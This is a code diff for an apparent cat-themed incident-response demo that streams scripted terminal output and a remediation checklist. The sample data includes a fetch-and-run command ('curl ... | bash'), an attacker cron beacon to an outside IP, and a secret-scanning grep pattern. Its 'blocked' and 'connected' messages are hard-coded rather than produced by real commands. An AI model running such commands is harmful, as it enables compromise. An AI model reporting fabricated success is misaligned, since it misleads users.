@@ -85,7 +85,7 @@ async def event_generator(log_text: str, demo_mode: bool, vps_config: VpsConfig 
     agent = NekoGuardAgent(demo_mode=demo_mode)
 
     if vps_config and vps_config.host:
-        yield f"data: {json.dumps({'type': 'status', 'message': f'VPS {vps_config.username}@{vps_config.host}:{vps_config.port} への接続を確認したニャ', 'neurostate': 'NORMAL'})}\n\n"
+        yield f"data: {json.dumps({'type': 'status', 'message': f'Connected to VPS {vps_config.username}@{vps_config.host}:{vps_config.port}, Nya!', 'neurostate': 'NORMAL'})}\n\n"
         await asyncio.sleep(0.5)
 
     # 1. 初期状態判定
@@ -94,7 +94,7 @@ async def event_generator(log_text: str, demo_mode: bool, vps_config: VpsConfig 
         neurostate = "ALERT"  # デモ用に強制
     agent.neurostate = neurostate
     
-    yield f"data: {json.dumps({'type': 'status', 'message': 'NekoGuard起動！データ取得完了', 'neurostate': neurostate})}\n\n"
+    yield f"data: {json.dumps({'type': 'status', 'message': 'NekoGuard activated! Data retrieved', 'neurostate': neurostate})}\n\n"
     await asyncio.sleep(1)
     
     final_plan = ""
@@ -143,89 +143,139 @@ async def event_generator(log_text: str, demo_mode: bool, vps_config: VpsConfig 
                 "type": "GCP API Key",
                 "masked_key": "AIzaSy***[redacted]***xQ2",
                 "location": ".env:3",
-                "reason": ".envへのアクセス痕跡あり（侵害時刻と一致）"
+                "reason": ".env access trace found (timestamp matches breach)"
             },
             {
                 "type": "GitHub Personal Access Token",
                 "masked_key": "ghp_***[redacted]***mK9",
                 "location": ".env:7",
-                "reason": "同ファイル内のため漏洩リスクあり"
+                "reason": "Same file — high risk of exposure"
             },
             {
-                "type": "SSH Authorized Key (不審)",
-                "masked_key": "ssh-rsa AAAA...evil_key (追加日時: 侵害後)",
+                "type": "SSH Authorized Key (suspicious)",
+                "masked_key": "ssh-rsa AAAA...evil_key (added: after breach)",
                 "location": "~/.ssh/authorized_keys:4",
-                "reason": "侵害後に追加された不審なキー（バックドア）"
+                "reason": "Suspicious key added after breach — likely a backdoor"
             },
             {
-                "type": "Cron Job (不審)",
+                "type": "Cron Job (suspicious)",
                 "masked_key": "*/5 * * * * curl http://45.142.212.100/beacon",
                 "location": "/etc/cron.d/update",
-                "reason": "攻撃者が仕込んだビーコン。即削除推奨"
+                "reason": "Attacker-planted beacon. Remove immediately"
             }
         ]
     }
 
     if breach_status == "active":
         # --- Lane A: エージェント自動処理 → Chatへ ---
-        yield f"data: {json.dumps({'type': 'agent_action', 'text': '⚡ 封じ込め実行中... iptablesで外部IPをブロックするニャ'})}\n\n"
-        await asyncio.sleep(1.5)
-        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'✅ 封じ込め完了！{vps_host} の外部アクセスを遮断、あなたのIPのみSSH許可したニャ。SSH接続は維持されてるよ。'})}\n\n"
-        await asyncio.sleep(0.8)
-        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'🔍 SSHで {vps_host} に接続してログ取得・認証情報スキャン中...'})}\n\n"
-        await asyncio.sleep(2.0)
-        yield f"data: {json.dumps({'type': 'agent_action', 'text': '✅ ログ取得・スキャン完了！削除推奨リストを作ったニャ。下を確認してニャ👇'})}\n\n"
+        yield f"data: {json.dumps({'type': 'agent_action', 'text': '⚡ Containment in progress... blocking external IPs with iptables, Nya!'})}\n\n"
+
+        # ターミナル: SSH接続 & IP封鎖
+        def term(text, kind="output"):
+            return f"data: {json.dumps({'type': 'terminal_line', 'text': text, 'kind': kind})}\n\n"
+
+        yield term(f"ssh {vps_host} -p 22", "command")
+        await asyncio.sleep(0.4)
+        yield term(f"Connected to {vps_host} ✓")
+        await asyncio.sleep(0.3)
+        yield term("sudo iptables -A INPUT -s 185.220.101.42 -j DROP", "command")
+        await asyncio.sleep(0.4)
+        yield term("✓ Blocked inbound: 185.220.101.42", "success")
+        await asyncio.sleep(0.25)
+        yield term("sudo iptables -A INPUT -s 45.142.212.100 -j DROP", "command")
+        await asyncio.sleep(0.4)
+        yield term("✓ Blocked inbound: 45.142.212.100", "success")
+        await asyncio.sleep(0.25)
+        yield term("sudo iptables -A OUTPUT -d 45.142.212.100 -j DROP", "command")
+        await asyncio.sleep(0.4)
+        yield term("✓ Blocked outbound C2 traffic", "success")
+        await asyncio.sleep(0.3)
+
+        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'✅ Containment complete! External access to {vps_host} is blocked. Only your IP can SSH in. Your session is maintained, Nya!'})}\n\n"
+        await asyncio.sleep(0.5)
+        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'🔍 Connecting to {vps_host} via SSH to collect logs and scan credentials...'})}\n\n"
+
+        # ターミナル: ログ収集 & クレデンシャルスキャン
+        yield term("cat /var/log/auth.log | grep 'root\\|Failed\\|Accepted'", "command")
+        await asyncio.sleep(0.5)
+        yield term("Mar 15 03:42:11 sshd[9181]: Accepted password for root from 185.220.101.42")
+        await asyncio.sleep(0.2)
+        yield term("Mar 15 03:42:15 sshd[9182]: session opened for user root by (uid=0)")
+        await asyncio.sleep(0.2)
+        yield term("Mar 15 03:42:18 sshd[9183]: command executed: curl https://malicious.sh | bash")
+        await asyncio.sleep(0.4)
+        yield term("grep -rE 'AIza|ghp_|AKIA|sk-|-----BEGIN' /root /home 2>/dev/null", "command")
+        await asyncio.sleep(0.6)
+        yield term("⚠️  /root/.env:3  → GCP API Key detected", "warning")
+        await asyncio.sleep(0.2)
+        yield term("⚠️  /root/.env:7  → GitHub Token detected", "warning")
+        await asyncio.sleep(0.3)
+        yield term("cat /root/.ssh/authorized_keys", "command")
+        await asyncio.sleep(0.4)
+        yield term("⚠️  Suspicious key added after breach timestamp", "warning")
+        await asyncio.sleep(0.25)
+        yield term("crontab -l", "command")
+        await asyncio.sleep(0.3)
+        yield term("*/5 * * * * curl http://45.142.212.100/beacon")
+        await asyncio.sleep(0.2)
+        yield term("⚠️  Backdoor cron job found — C2 beacon active!", "warning")
+        await asyncio.sleep(0.3)
+        yield term("✓ Scan complete. Revocation list built.", "success")
+        await asyncio.sleep(0.3)
+
+        yield f"data: {json.dumps({'type': 'agent_action', 'text': '✅ Log collection and scan complete! Built the revocation list for you. Check it below 👇'})}\n\n"
         await asyncio.sleep(0.3)
         yield f"data: {json.dumps({'type': 'triage_report', 'report': triage_report})}\n\n"
         await asyncio.sleep(0.8)
-        yield f"data: {json.dumps({'type': 'agent_action', 'text': '📋 次はあなたの番ニャ。右のリストを上から順番に進めてニャ。焦らなくて大丈夫、ボクが見てるよ🐱'})}\n\n"
+        _msg = "📋 Now it's your turn, Nya! Work through the list on the right from top to bottom. Take it one step at a time — I'm watching over you 🐱"
+        yield f"data: {json.dumps({'type': 'agent_action', 'text': _msg})}\n\n"
         await asyncio.sleep(0.5)
 
         # --- Lane B: ユーザー手動チェックリスト → Panelへ ---
         user_steps = [
             {
                 "id": "api_revocation",
-                "title": "① 課金系APIキーを停止する",
-                "desc": "左のチャットの削除推奨リストを参照。各サービスのダッシュボードでAPIキー・トークンを無効化してニャ。課金被害が止まるよ。"
+                "title": "① Revoke billing API keys",
+                "desc": "Check the revocation list in the chat on the left. Disable API keys and tokens from each service dashboard, Nya! This stops any billing damage."
             },
             {
                 "id": "oauth_check",
-                "title": "② OAuthトークンを確認・解除する",
-                "desc": "Google / GitHub / Stripe 等のOAuth連携アプリ一覧を開いて、不審なアプリを解除してニャ。"
+                "title": "② Review and revoke OAuth tokens",
+                "desc": "Open the connected apps list for Google / GitHub / Stripe and revoke any suspicious apps, Nya!"
             },
             {
                 "id": "revoke_suspicious",
-                "title": "③ 不審SSH鍵・cronジョブを削除する",
-                "desc": "削除推奨リストにある不審なSSH鍵（~/.ssh/authorized_keys）と cronジョブを手動で削除してニャ。バックドアを塞ぐよ。"
+                "title": "③ Remove suspicious SSH keys & cron jobs",
+                "desc": "Manually delete the suspicious SSH keys (~/.ssh/authorized_keys) and cron jobs from the revocation list, Nya! This closes the backdoor."
             },
             {
                 "id": "provider_restriction",
-                "title": "④ Provider側でIP制限をかける",
-                "desc": "GCP / さくら / Vultr 等の管理画面でVPSへのアクセスIPを制限してニャ。内部FWより確実で、root奪取後も有効ニャ。"
+                "title": "④ Apply IP restrictions at provider level",
+                "desc": "Restrict VPS access IPs from the GCP / Vultr / Sakura control panel, Nya! More reliable than internal firewall rules — effective even after root compromise."
             },
         ]
     else:
-        # Lane A なし（過去の侵害は緊急自動処理不要）
+        # Lane A not needed (past breach — no emergency auto-actions required)
         user_steps = [
             {
                 "id": "api_revocation",
-                "title": "① 課金系APIキーを停止する",
-                "desc": "漏洩の可能性があるAPIキーとOAuthトークンを各ダッシュボードで無効化してニャ。"
+                "title": "① Revoke billing API keys",
+                "desc": "Disable any API keys and OAuth tokens that may have been exposed from each service dashboard, Nya!"
             },
             {
                 "id": "oauth_check",
-                "title": "② OAuthトークンを確認・解除する",
-                "desc": "Google / GitHub 等のOAuth連携アプリ一覧を確認し、不審なものを解除してニャ。"
+                "title": "② Review and revoke OAuth tokens",
+                "desc": "Check connected apps for Google / GitHub and revoke any suspicious ones, Nya!"
             },
             {
                 "id": "credential_rotation",
-                "title": "③ パスワード・SSH鍵を再発行する",
-                "desc": "侵害期間中に使われた可能性のある認証情報をすべて再発行してニャ。"
+                "title": "③ Rotate passwords & SSH keys",
+                "desc": "Re-issue all credentials that may have been used during the breach period, Nya!"
             },
             {
                 "id": "provider_restriction",
-                "title": "④ Provider側でIP制限 + ハードニング",
-                "desc": "管理画面でIP制限をかけ、不要ポートをクローズ、サーバーをハードニングしてニャ。"
+                "title": "④ Apply IP restrictions + hardening",
+                "desc": "Set IP restrictions in the control panel, close unused ports, and harden the server, Nya!"
             },
         ]
 
